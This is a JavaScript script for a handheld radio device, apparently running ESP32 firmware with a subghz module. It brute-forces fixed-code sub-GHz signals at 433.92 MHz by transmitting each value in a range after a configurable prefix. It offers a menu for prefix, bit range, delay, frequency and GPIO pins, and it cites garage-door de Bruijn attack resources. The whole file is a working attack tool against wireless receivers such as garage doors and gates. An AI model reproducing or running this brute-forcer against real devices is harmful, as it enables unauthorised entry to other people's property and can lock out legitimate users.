var display = require('display');
var keyboardApi = require('keyboard');
var dialog = require('dialog');
var subghz = require('subghz');
var gpio = require('gpio');

var fillScreen = display.fill;
var drawString = display.drawString;
var getAnyPress = keyboardApi.getAnyPress;
var keyboardPrompt = keyboardApi.keyboard;
var dialogChoice = dialog.choice;
var dialogError = dialog.error;
var subghzTransmit = subghz.transmit;
// bruteforce RF signals
// derived from https://github.com/mcore1976/cc1101-tool/blob/main/cc1101-tool-esp32.ino#617
// for a more efficient attack look at https://github.com/UberGuidoZ/Flipper/tree/main/Sub-GHz/Garages/deBruijn
// use at your own risk, some devices may lock you out as a security mechanism when spammed with this!

// GPIO pin configuration
var gpio_config = {
  rf_pin: 27,  // RF transmitter GPIO pin
  led_pin: 4   // LED indicator GPIO pin
};

var value_prefix = 0x445700;
var no_bits = 8;  // 1-byte range -> 2^8=256 values to try
var delay_ms = 200;  // delay after each try
var freq = 433920000;  // fixed frequency


function brute_force() {
    var max_val = value_prefix + (1 << no_bits);

    for ( var brute_val = value_prefix; brute_val < max_val ; brute_val++) {
        fillScreen(0);
        var curr_val = brute_val.toString(16).toUpperCase();

        drawString("sending", 3 , 0);
        drawString(curr_val, 3 , 16);
        drawString("hold any key to stop", 3 , 32);

        if(getAnyPress()) break;

        // example full cmd: "subghz tx 445533 433920000 174 10"
        //serialCmd("subghz tx " + curr_val + " " + freq + " 174 10");


        var r = subghzTransmit(curr_val, freq, 174, 10);
        // TODO: customize te=174  count=10

        if(!r) drawString("ERROR: check serial log", 3 , 64);

        delay(delay_ms);
    }
}


while(true)
{
    var menu_options = {};
    menu_options["Init value:" + value_prefix] = "value_prefix";
    menu_options["Range bits:" + no_bits] = "no_bits";
    menu_options["Delay: " + delay_ms] = "delay_ms";
    menu_options["Frequency:" + freq] = "freq";
    menu_options["GPIO Settings"] = "gpio_settings";
    menu_options["Start attack"] = "attack";

    var choice = dialogChoice(menu_options);

    if(choice=="") break;  // quit
    else if(choice=="value_prefix") value_prefix = parseInt(keyboardPrompt(String(value_prefix), 32, "starting value"));
    else if(choice=="no_bits") no_bits = parseInt(keyboardPrompt(String(no_bits), 32, "bits to iterate"));
    else if(choice=="delay_ms") delay_ms = parseInt(keyboardPrompt(String(delay_ms), 32, "delay afear each try (in ms)"));
    else if(choice=="freq") freq = parseInt(keyboardPrompt(String(freq), 32, "Frequency"));
    else if(choice=="gpio_settings") {
        var gpio_menu = {};
        gpio_menu["RF Pin (current: " + gpio_config.rf_pin + ")"] = "rf_pin";
        gpio_menu["LED Pin (current: " + gpio_config.led_pin + ")"] = "led_pin";
        gpio_menu["Back"] = "";
        
        var gpio_choice = dialogChoice(gpio_menu);
        if(gpio_choice == "rf_pin") {
            var new_pin = parseInt(keyboardPrompt(String(gpio_config.rf_pin), 32, "RF transmitter GPIO pin"));
            if(!isNaN(new_pin)) gpio_config.rf_pin = new_pin;
        }
        else if(gpio_choice == "led_pin") {
            var new_pin = parseInt(keyboardPrompt(String(gpio_config.led_pin), 32, "LED indicator GPIO pin"));
            if(!isNaN(new_pin)) gpio_config.led_pin = new_pin;
        }
    }
    else if(choice=="attack") {
        if(!value_prefix || !no_bits || !delay_ms || !freq) {
            dialogError("invalid params");
            continue;
        }
        brute_force();
  }

  fillScreen(0); // clear screen
}
